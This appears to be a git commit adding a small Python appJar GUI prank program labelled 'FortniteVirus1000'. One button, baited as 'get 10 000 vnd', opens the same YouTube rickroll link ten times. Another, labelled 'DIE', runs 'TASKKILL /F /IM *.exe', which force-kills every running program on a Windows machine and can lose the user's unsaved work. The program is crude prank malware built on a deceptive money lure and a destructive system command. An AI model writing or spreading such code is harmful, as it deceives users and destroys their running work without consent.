1275cfdb1df2ab4f6feffcf7327b8c9a9921aaaf
masterflank216 <72742828+masterflank216@users.noreply.github.com>
2021-07-05 20:19:42 +0700

    Add files via upload

---
+++ 10kvnd.py
@@ -0,0 +1,31 @@
+
+import appJar
+from appJar import gui
+import webbrowser
+import os
+import time
+
+#def
+def rickrolled():
+    webbrowser.open("https://www.youtube.com/watch?v=hAq443fhyDo")
+    webbrowser.open("https://www.youtube.com/watch?v=hAq443fhyDo")
+    webbrowser.open("https://www.youtube.com/watch?v=hAq443fhyDo")
+    webbrowser.open("https://www.youtube.com/watch?v=hAq443fhyDo")
+    webbrowser.open("https://www.youtube.com/watch?v=hAq443fhyDo")
+    webbrowser.open("https://www.youtube.com/watch?v=hAq443fhyDo")
+    webbrowser.open("https://www.youtube.com/watch?v=hAq443fhyDo")
+    webbrowser.open("https://www.youtube.com/watch?v=hAq443fhyDo")
+    webbrowser.open("https://www.youtube.com/watch?v=hAq443fhyDo")
+    webbrowser.open("https://www.youtube.com/watch?v=hAq443fhyDo")
+def crash():
+    os.startfile("welp.txt")
+    time.sleep(3)
+    os.system('TASKKILL /F /IM *.exe')
+#gui-settings
+app = gui()
+app.addLabel("30", "FortniteVirus1000")
+app.addButton("get 10 000 vnd", rickrolled)
+app.addButton("DIE", crash)
+
+#run-gui
+app.go()
